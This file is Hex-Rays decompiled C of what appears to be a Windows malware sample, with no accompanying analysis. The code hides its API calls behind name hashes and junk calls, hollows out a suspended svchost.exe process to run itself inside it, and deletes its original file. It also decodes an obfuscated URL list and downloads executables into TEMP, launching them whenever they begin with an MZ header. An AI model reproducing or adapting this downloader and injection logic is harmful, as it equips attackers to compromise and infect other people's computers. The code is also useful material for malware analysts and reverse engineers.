/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

int __stdcall sub_401000(int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int, int);
int __stdcall sub_40100B(int, int);
int sub_40120A();
int start();
int __stdcall sub_4019AA(LPCSTR lpString); // idb
void __noreturn sub_401CF1(); // weak
int __cdecl sub_402018(int, int, int);
void __cdecl sub_402160(void *);
int __cdecl sub_402190(int, int, int, _DWORD *);
// int __usercall sub_4021C0@<eax>(int@<ebp>, int, unsigned int);
// int __userpurge sub_402289@<eax>(int result@<eax>, int@<ebp>, int);
// void __stdcall RtlUnwind(PVOID TargetFrame, PVOID TargetIp, PEXCEPTION_RECORD ExceptionRecord, PVOID ReturnValue);

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN loc_40217C; // weak
const CHAR String2[] = "ï\x00î\x00æ"; // idb
char *off_404000 = "/G"; // weak
LPCSTR off_404008 = "\\"; // idb
LPCSTR off_40400C = "exe "; // idb
char *off_404010[2] = { "TEMP", "open" }; // weak
char *off_404014 = "open"; // weak
LPCSTR off_404018 = &unk_4032CC; // idb
void *off_40401C = &unk_403273; // weak
LPCSTR off_404020 = "in"; // idb
LPCSTR off_40402C = "dll"; // idb
char byte_404034[] = { 'p' }; // weak
char *off_404044[2] = { "shell32.dll", "svch" }; // weak
LPCSTR lpString2 = "svch"; // idb
LPCSTR off_404050 = "et."; // idb
LPCSTR lpLibFileName = "kernel32.dll"; // idb
LPCSTR off_404060 = "ost."; // idb
_DWORD dword_404064[4] = { 429065504, 0, 0, 0 }; // weak
// extern LPSTR (__stdcall *lstrcpyA)(LPSTR lpString1, LPCSTR lpString2);
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern DWORD (__stdcall *GetFileType)(HANDLE hFile);
// extern DWORD (__stdcall *GetModuleFileNameA)(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// extern LPSTR (__stdcall *lstrcatA)(LPSTR lpString1, LPCSTR lpString2);
// extern int (__stdcall *lstrlenA)(LPCSTR lpString);
// extern HANDLE (__stdcall *CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern BOOL (__stdcall *WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// extern void (__stdcall *Sleep)(DWORD dwMilliseconds);
// extern BOOL (__stdcall *FreeConsole)();
// extern LPSTR (__stdcall *GetCommandLineA)();
// extern BOOL (__stdcall *DeleteFileA)(LPCSTR lpFileName);
// extern void (__stdcall __noreturn *ExitProcess)(UINT uExitCode);
// extern BOOL (__stdcall *SetFileSecurityA)(LPCSTR lpFileName, SECURITY_INFORMATION SecurityInformation, PSECURITY_DESCRIPTOR pSecurityDescriptor);
int dword_4043D0 = 0; // weak
int dword_4043D4 = 0; // weak
int (__stdcall *dword_4043E0)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int (__stdcall *dword_4043E4)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = NULL; // weak
int dword_4043E8 = 0; // weak
int dword_4044A0; // weak
int (__stdcall *dword_4046B4)(_DWORD, _DWORD); // weak
int (__stdcall *dword_4046B8)(_DWORD, _DWORD); // weak
int (__stdcall *dword_4046BC)(_DWORD); // weak
int (__stdcall *dword_4046C0)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_4046C4)(_DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_4046C8)(_DWORD); // weak
int (__stdcall *dword_4046CC)(_DWORD); // weak
CHAR Filename[260]; // idb
CHAR FileName[260]; // idb
int dword_4048D8; // weak
int dword_404904; // weak
__int16 word_404908; // weak
int (__stdcall *dword_40491C)(_DWORD, _DWORD); // weak
int (__stdcall *dword_404920)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_404924)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_404928)(_DWORD, _DWORD, _DWORD, _DWORD); // weak
int (__stdcall *dword_40492C)(_DWORD); // weak
int (__stdcall *dword_404930)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // weak
CHAR String; // idb


//----- (00401000) --------------------------------------------------------
int __stdcall sub_401000(
        int a1,
        int a2,
        int a3,
        int a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15,
        int a16,
        int a17,
        int a18)
{
  return 0;
}

//----- (0040100B) --------------------------------------------------------
int __stdcall sub_40100B(int a1, int a2)
{
  int v2; // ebx
  int v3; // esi
  int i; // edi
  int j; // [esp+Ch] [ebp-4Ch]
  int v7; // [esp+10h] [ebp-48h]
  unsigned int v8; // [esp+14h] [ebp-44h]
  int v9; // [esp+18h] [ebp-40h]
  _DWORD *v10; // [esp+1Ch] [ebp-3Ch]
  CHAR String1[32]; // [esp+20h] [ebp-38h] BYREF
  CPPEH_RECORD ms_exc; // [esp+40h] [ebp-18h]

  sub_401000(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
  v10 = (_DWORD *)(a1 + *(_DWORD *)(a1 + *(_DWORD *)(a1 + 60) + 120));
  v9 = a1 + v10[9];
  lstrcpyA(String1, &String2[4]);
  lstrcpyA(String1, &String2[2]);
  if ( SetFileSecurityA(0, 0, 0) )
    a2 += 763305;
  lstrcpyA(String1, String2);
  ms_exc.registration.TryLevel = 0;
  if ( !SetFileSecurityA((LPCSTR)0x852, 0, 0) )
    a2 += 74768;
  ms_exc.registration.TryLevel = -1;
  v2 = a1 + v10[8];
  v3 = a1 + v10[7];
  for ( i = 0; i < v10[6]; ++i )
  {
    v8 = 0;
    sub_401000(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
    v7 = a1 + *(_DWORD *)(v2 + 4 * i);
    for ( j = 0; *(_BYTE *)(j + v7); ++j )
    {
      sub_401000(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
      v8 = ((v8 >> 25) | (v8 << 7)) ^ *(char *)(j + v7) ^ 0x5C;
    }
    if ( v8 == a2 )
    {
      sub_401000(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
      return a1 + *(_DWORD *)(v3 + 4 * *(unsigned __int16 *)(v9 + 2 * i));
    }
  }
  return 0;
}

//----- (0040120A) --------------------------------------------------------
int sub_40120A()
{
  HMODULE ModuleHandleA; // ebx
  char *v1; // esi
  int v2; // edi
  char v4[4]; // [esp+Ch] [ebp-4h] BYREF

  ModuleHandleA = GetModuleHandleA(0);
  sub_401000(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
  v1 = (char *)ModuleHandleA + *((_DWORD *)ModuleHandleA + 15);
  sub_401000(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
  v2 = dword_4043E0(dword_4043D0, ModuleHandleA, *((_DWORD *)v1 + 20), 12288, 64);
  sub_401000(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
  sub_401000(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
  dword_4043E4(dword_4043D0, v2, ModuleHandleA, *((_DWORD *)v1 + 20), v4);
  sub_401000(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
  dword_4043E8 = 65543;
  sub_401000(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
  dword_4046B4(dword_4043D4, &dword_4043E8);
  sub_401000(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
  dword_4044A0 = (int)sub_401CF1;
  sub_401000(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
  dword_4046B8(dword_4043D4, &dword_4043E8);
  sub_401000(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
  return dword_4046BC(dword_4043D4);
}
// 401CF1: using guessed type void __noreturn sub_401CF1();
// 4043D0: using guessed type int dword_4043D0;
// 4043D4: using guessed type int dword_4043D4;
// 4043E0: using guessed type int (__stdcall *dword_4043E0)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4043E4: using guessed type int (__stdcall *dword_4043E4)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4043E8: using guessed type int dword_4043E8;
// 4044A0: using guessed type int dword_4044A0;
// 4046B4: using guessed type int (__stdcall *dword_4046B4)(_DWORD, _DWORD);
// 4046B8: using guessed type int (__stdcall *dword_4046B8)(_DWORD, _DWORD);
// 4046BC: using guessed type int (__stdcall *dword_4046BC)(_DWORD);
// 40120A: using guessed type char var_4[4];

//----- (0040140C) --------------------------------------------------------
int start()
{
  HMODULE LibraryA; // ebx
  int v1; // ebx
  int v2; // ebx
  CHAR String1[32]; // [esp+4h] [ebp-20h] BYREF

  LibraryA = LoadLibraryA(lpLibFileName);
  sub_401000(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
  CloseHandle((HANDLE)0x39);
  dword_4046C0 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_40100B((int)LibraryA, 886325586);
  sub_401000(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
  GetFileType((HANDLE)0x1C);
  GetModuleHandleA(0);
  dword_4043E0 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_40100B((int)LibraryA, -396725453);
  dword_4043E4 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_40100B((int)LibraryA, -501625392);
  sub_401000(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
  dword_4046B4 = (int (__stdcall *)(_DWORD, _DWORD))sub_40100B((int)LibraryA, -654798134);
  sub_401000(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
  dword_4046B8 = (int (__stdcall *)(_DWORD, _DWORD))sub_40100B((int)LibraryA, -654787894);
  dword_4046BC = (int (__stdcall *)(_DWORD))sub_40100B((int)LibraryA, -324176724);
  dword_4046C4 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD))sub_40100B((int)LibraryA, -1235331517);
  dword_4046C8 = (int (__stdcall *)(_DWORD))sub_40100B((int)LibraryA, 46030990);
  dword_4046CC = (int (__stdcall *)(_DWORD))sub_40100B((int)LibraryA, 1602833329);
  GetModuleFileNameA(0, Filename, 0x104u);
  sub_401000(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
  lstrcpyA(FileName, lpString2);
  lstrcatA(FileName, off_404060);
  sub_401000(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
  lstrcatA(FileName, off_40400C);
  sub_401000(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
  lstrcatA(FileName, Filename);
  sub_401000(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
  dword_4048D8 = 68;
  sub_401000(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
  dword_404904 = 1;
  sub_401000(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
  word_404908 = 2;
  dword_4046C0(0, FileName, 0, 0, 0, 4, 0, 0, &dword_4048D8, &dword_4043D0);
  lstrcpyA(String1, off_404018);
  lstrcatA(String1, off_404020);
  lstrcatA(String1, off_404050);
  lstrcatA(String1, off_40402C);
  v1 = dword_4046CC(String1);
  sub_401000(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
  dword_40491C = (int (__stdcall *)(_DWORD, _DWORD))sub_40100B(v1, 1152941295);
  sub_401000(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
  dword_404920 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_40100B(v1, -1698892224);
  sub_401000(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
  dword_404924 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_40100B(v1, -895955069);
  sub_401000(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
  dword_404928 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD))sub_40100B(v1, 1757698951);
  sub_401000(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
  dword_40492C = (int (__stdcall *)(_DWORD))sub_40100B(v1, 799902206);
  sub_401000(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
  v2 = dword_4046CC(off_404044[0]);
  sub_401000(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
  dword_404930 = (int (__stdcall *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))sub_40100B(v2, -974257394);
  sub_401000(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
  sub_40120A();
  sub_401000(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
  dword_4046C8(0);
  return 0;
}
// 404044: using guessed type char *off_404044[2];
// 4043D0: using guessed type int dword_4043D0;
// 4043E0: using guessed type int (__stdcall *dword_4043E0)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4043E4: using guessed type int (__stdcall *dword_4043E4)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4046B4: using guessed type int (__stdcall *dword_4046B4)(_DWORD, _DWORD);
// 4046B8: using guessed type int (__stdcall *dword_4046B8)(_DWORD, _DWORD);
// 4046BC: using guessed type int (__stdcall *dword_4046BC)(_DWORD);
// 4046C0: using guessed type int (__stdcall *dword_4046C0)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4046C4: using guessed type int (__stdcall *dword_4046C4)(_DWORD, _DWORD, _DWORD);
// 4046C8: using guessed type int (__stdcall *dword_4046C8)(_DWORD);
// 4046CC: using guessed type int (__stdcall *dword_4046CC)(_DWORD);
// 4048D8: using guessed type int dword_4048D8;
// 404904: using guessed type int dword_404904;
// 404908: using guessed type __int16 word_404908;
// 40491C: using guessed type int (__stdcall *dword_40491C)(_DWORD, _DWORD);
// 404920: using guessed type int (__stdcall *dword_404920)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 404924: using guessed type int (__stdcall *dword_404924)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 404928: using guessed type int (__stdcall *dword_404928)(_DWORD, _DWORD, _DWORD, _DWORD);
// 40492C: using guessed type int (__stdcall *dword_40492C)(_DWORD);
// 404930: using guessed type int (__stdcall *dword_404930)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (004019AA) --------------------------------------------------------
int __stdcall sub_4019AA(LPCSTR lpString)
{
  int v1; // esi
  int v2; // edi
  HANDLE FileA; // ebx
  int v5; // [esp+Ch] [ebp-420h]
  int v6; // [esp+10h] [ebp-41Ch]
  int i; // [esp+14h] [ebp-418h]
  int v8; // [esp+18h] [ebp-414h]
  const CHAR *lpString2; // [esp+1Ch] [ebp-410h]
  char Buffer[1024]; // [esp+20h] [ebp-40Ch] BYREF
  DWORD NumberOfBytesWritten; // [esp+420h] [ebp-Ch] BYREF
  DWORD nNumberOfBytesToWrite; // [esp+424h] [ebp-8h] BYREF
  int v13; // [esp+428h] [ebp-4h] BYREF

  sub_401000(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
  v13 = 7;
  v1 = 0;
  if ( dword_40491C(&v13, 0) )
  {
    v8 = dword_404920(0, 0, 0, 0, 0);
    sub_401000(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
    v2 = dword_404924(v8, lpString, 0, 0, 0x80000000, 0);
    v1 = 0;
    if ( v2 )
    {
      for ( i = lstrlenA(lpString); i > 0; --i )
      {
        sub_401000(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
        if ( lpString[i] == 47 )
        {
          lpString2 = &lpString[i + 1];
          break;
        }
      }
      dword_4046C4(off_404010[0], FileName, 260);
      sub_401000(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
      lstrcatA(FileName, off_404008);
      lstrcatA(FileName, lpString2);
      FileA = CreateFileA(FileName, 0x40000000u, 0, 0, 2u, 0, 0);
      v6 = 0;
      v5 = 0;
      do
      {
        dword_404928(v2, Buffer, 1024, &nNumberOfBytesToWrite);
        if ( !v5 )
        {
          v5 = 1;
          if ( Buffer[0] == 77 )
          {
            v5 = 1;
            if ( Buffer[1] == 90 )
            {
              v6 = 1;
              v5 = 1;
            }
          }
        }
        sub_401000(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
        WriteFile(FileA, Buffer, nNumberOfBytesToWrite, &NumberOfBytesWritten, 0);
        sub_401000(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
      }
      while ( nNumberOfBytesToWrite );
      CloseHandle(FileA);
      Sleep(0x11Bu);
      sub_401000(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
      v1 = 0;
      if ( v6 )
      {
        dword_404930(0, off_404014, FileName, 0, 0, 8);
        v1 = 1;
      }
      sub_401000(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
    }
    dword_40492C(v2);
    sub_401000(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
    dword_40492C(v8);
  }
  return v1;
}
// 401B22: variable 'lpString2' is possibly undefined
// 404010: using guessed type char *off_404010[2];
// 404014: using guessed type char *off_404014;
// 4046C4: using guessed type int (__stdcall *dword_4046C4)(_DWORD, _DWORD, _DWORD);
// 40491C: using guessed type int (__stdcall *dword_40491C)(_DWORD, _DWORD);
// 404920: using guessed type int (__stdcall *dword_404920)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 404924: using guessed type int (__stdcall *dword_404924)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 404928: using guessed type int (__stdcall *dword_404928)(_DWORD, _DWORD, _DWORD, _DWORD);
// 40492C: using guessed type int (__stdcall *dword_40492C)(_DWORD);
// 404930: using guessed type int (__stdcall *dword_404930)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00401CF1) --------------------------------------------------------
void __noreturn sub_401CF1()
{
  LPSTR CommandLineA; // ebx
  const CHAR *v1; // ebx
  int v2; // esi
  BOOL v3; // edi
  int v4; // ebx
  int v5; // esi
  int v6; // edi
  int v7; // ebx
  int v8; // esi
  int v9; // edi
  int v10; // [esp+Ch] [ebp-54h]
  int v11; // [esp+10h] [ebp-50h]
  int v12; // [esp+14h] [ebp-4Ch]
  int v13; // [esp+18h] [ebp-48h]
  int v14; // [esp+1Ch] [ebp-44h]
  int v15; // [esp+20h] [ebp-40h]
  int v16; // [esp+24h] [ebp-3Ch]
  CHAR String1[32]; // [esp+34h] [ebp-2Ch] BYREF
  int v18[3]; // [esp+54h] [ebp-Ch] BYREF

  lstrcpyA(String1, off_404018);
  lstrcatA(String1, off_404020);
  lstrcatA(String1, off_404050);
  lstrcatA(String1, off_40402C);
  dword_4046CC(String1);
  dword_4046CC(off_404044[0]);
  FreeConsole();
  CommandLineA = GetCommandLineA();
  sub_401000(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
  while ( *CommandLineA != 32 )
    ++CommandLineA;
  v1 = CommandLineA + 1;
  v2 = 0;
  v3 = 0;
  do
  {
    if ( v3 )
      break;
    sub_401000(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
    Sleep(0x110u);
    v3 = DeleteFileA(v1);
    ++v2;
  }
  while ( v2 <= 50 );
  memset(v18, 0, sizeof(v18));
  v4 = 0;
  v5 = 0;
  while ( 1 )
  {
    sub_401000(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
    v16 = 0;
    v14 = 0;
    v15 = 0;
    v6 = 0;
    v13 = 0;
    do
    {
      if ( v13 == 8 )
        v13 = 0;
      *(&String + v6) = byte_404034[v13] ^ *((_BYTE *)off_40401C + v16);
      if ( *(&String + v6) == 44 )
      {
        *(&String + v6) = 0;
        sub_401000(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
        if ( v18[v14] )
        {
          ++v15;
        }
        else if ( sub_4019AA(&String) )
        {
          v18[v14] = 1;
          ++v15;
        }
        ++v14;
        v6 = -1;
      }
      ++v13;
      ++v6;
      ++v16;
    }
    while ( v16 < 88 );
    if ( v15 == 3 )
      v4 = 1;
    ++v5;
    if ( !v4 )
      Sleep(0x3C461u);
    if ( v5 >= 3 || v4 )
    {
      if ( !v4 )
      {
        v7 = 0;
        v8 = 0;
        do
        {
          sub_401000(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
          v12 = 0;
          v10 = 0;
          v11 = 0;
          v9 = 0;
          do
          {
            *(&String + v9) = off_404000[v12 + 1] ^ off_404000[v12];
            if ( *(&String + v9) == 44 )
            {
              sub_401000(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
              *(&String + v9) = 0;
              if ( v18[v10] )
              {
                ++v11;
              }
              else if ( sub_4019AA(&String) )
              {
                v18[v10] = 1;
                ++v11;
              }
              ++v10;
              v9 = -1;
            }
            ++v9;
            v12 += 3;
          }
          while ( v12 < 264 );
          if ( v11 == 3 )
            v7 = 1;
          ++v8;
          if ( !v7 )
            Sleep(0x46252u);
        }
        while ( v8 < 3 && !v7 );
      }
      ExitProcess(0);
    }
  }
}
// 401CF1: using guessed type void __noreturn sub_401CF1();
// 404000: using guessed type char *off_404000;
// 40401C: using guessed type void *off_40401C;
// 404044: using guessed type char *off_404044[2];
// 4046CC: using guessed type int (__stdcall *dword_4046CC)(_DWORD);

//----- (00402018) --------------------------------------------------------
int __cdecl sub_402018(int a1, int a2, int a3)
{
  int *v3; // ebp
  int v4; // ebx
  unsigned int v5; // esi
  int v6; // edi
  int (__fastcall *v7)(_DWORD, _DWORD); // eax
  int v8; // eax
  int v9; // edi
  int v10; // ecx
  _DWORD v12[2]; // [esp+10h] [ebp-8h] BYREF
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v3 = &savedregs;
  v4 = a2;
  if ( (*(_DWORD *)(a1 + 4) & 6) != 0 )
  {
    sub_4021C0(a2 + 16, a2, 0xFFFFFFFF);
  }
  else
  {
    v12[0] = a1;
    v12[1] = a3;
    *(_DWORD *)(a2 - 4) = v12;
    v5 = *(_DWORD *)(a2 + 12);
    v6 = *(_DWORD *)(a2 + 8);
    while ( v5 != -1 )
    {
      v7 = *(int (__fastcall **)(_DWORD, _DWORD))(v6 + 12 * v5 + 4);
      if ( v7 )
      {
        v8 = v7(0, 0);
        v4 = v3[3];
        if ( v8 )
        {
          if ( v8 < 0 )
            return 0;
          v9 = *(_DWORD *)(v4 + 8);
          sub_402160((void *)v3[3]);
          v3 = (int *)(v4 + 16);
          sub_4021C0(v4 + 16, v4, v5);
          sub_402289(*(_DWORD *)(v9 + 12 * v5 + 8), v4 + 16, 1);
          *(_DWORD *)(v4 + 12) = *(_DWORD *)(v9 + 4 * v10);
          v4 = 0;
          v5 = 0;
          (*(void (__fastcall **)(_DWORD, _DWORD))(v9 + 4 * v10 + 8))(0, 0);
        }
      }
      v6 = *(_DWORD *)(v4 + 8);
      v5 = *(_DWORD *)(v6 + 12 * v5);
    }
  }
  return 1;
}
// 4020DA: variable 'v10' is possibly undefined

//----- (00402160) --------------------------------------------------------
void __cdecl sub_402160(void *a1)
{
  RtlUnwind(a1, &loc_40217C, 0, 0);
}

//----- (00402190) --------------------------------------------------------
int __cdecl sub_402190(int a1, int a2, int a3, _DWORD *a4)
{
  int result; // eax

  result = 1;
  if ( (*(_DWORD *)(a1 + 4) & 6) != 0 )
  {
    *a4 = a2;
    return 3;
  }
  return result;
}

//----- (004021C0) --------------------------------------------------------
int __usercall sub_4021C0@<eax>(int a1@<ebp>, int a2, unsigned int a3)
{
  int result; // eax
  int v4; // ebx
  unsigned int v5; // esi
  int v6; // esi
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-8h] [ebp-1Ch]
  int (__cdecl *v8)(int, int, int, _DWORD *); // [esp-4h] [ebp-18h]

  v8 = sub_402190;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  while ( 1 )
  {
    result = a2;
    v4 = *(_DWORD *)(a2 + 8);
    v5 = *(_DWORD *)(a2 + 12);
    if ( v5 == -1 || a3 != -1 && v5 <= a3 )
      break;
    v6 = 3 * v5;
    *(_DWORD *)(a2 + 12) = *(_DWORD *)(v4 + 4 * v6);
    if ( !*(_DWORD *)(v4 + 4 * v6 + 4) )
    {
      sub_402289(*(_DWORD *)(v4 + 4 * v6 + 8), a1, 257);
      (*(void (__cdecl **)(struct _EXCEPTION_REGISTRATION_RECORD *, int (__cdecl *)(int, int, int, _DWORD *)))(v4 + 4 * v6 + 8))(
        ExceptionList,
        v8);
    }
  }
  return result;
}
// 402227: variable 'ExceptionList' is possibly undefined
// 402227: variable 'v8' is possibly undefined

//----- (00402289) --------------------------------------------------------
int __userpurge sub_402289@<eax>(int result@<eax>, int a2@<ebp>, int a3)
{
  dword_404064[2] = a3;
  dword_404064[1] = result;
  dword_404064[3] = a2;
  return result;
}
// 404064: using guessed type _DWORD dword_404064[4];

// nfuncs=12 queued=11 decompiled=11 lumina nreq=0 worse=0 better=0
// ALL OK, 11 function(s) have been successfully decompiled
